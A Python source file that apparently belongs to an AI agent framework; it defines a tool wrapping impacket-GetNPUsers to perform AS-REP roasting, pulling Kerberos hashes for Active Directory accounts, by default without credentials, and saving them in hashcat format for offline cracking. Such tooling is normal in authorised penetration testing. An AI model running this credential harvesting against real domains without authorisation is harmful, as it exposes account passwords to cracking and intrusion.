from __future__ import annotations
from typing import Any

from backend.agent.tools.base import BaseTool, ToolResult, OnOutputCallback
from backend.agent.tools import executor


class ImpacketGetNPUsersTool(BaseTool):
    name = "run_getnpusers"
    description = (
        "Run impacket-GetNPUsers to perform AS-REP roasting. "
        "Finds Active Directory accounts with Kerberos pre-authentication disabled and retrieves "
        "their AS-REP hashes, which can be cracked offline with hashcat or john."
    )
    parameters = {
        "type": "object",
        "properties": {
            "target": {
                "type": "string",
                "description": "Domain/username@DC_IP e.g. 'corp.local/' or 'corp.local/user:pass@10.0.0.1'",
            },
            "user_file": {
                "type": "string",
                "description": "File containing usernames to test (one per line)",
            },
            "output_file": {
                "type": "string",
                "description": "Save captured hashes to this file e.g. /tmp/asrep_hashes.txt",
            },
            "no_pass": {
                "type": "boolean",
                "description": "Don't require a password (enumerate without credentials)",
            },
        },
        "required": ["target"],
    }

    async def run(
        self,
        on_output: OnOutputCallback,
        target: str,
        user_file: str | None = None,
        output_file: str = "/tmp/asrep_hashes.txt",
        no_pass: bool = True,
        **_: Any,
    ) -> ToolResult:
        args = ["impacket-GetNPUsers", target, "-outputfile", output_file, "-format", "hashcat"]
        if no_pass:
            args.append("-no-pass")
        if user_file:
            args += ["-usersfile", user_file]
        return await executor.execute(self.name, args, on_output, timeout=120)
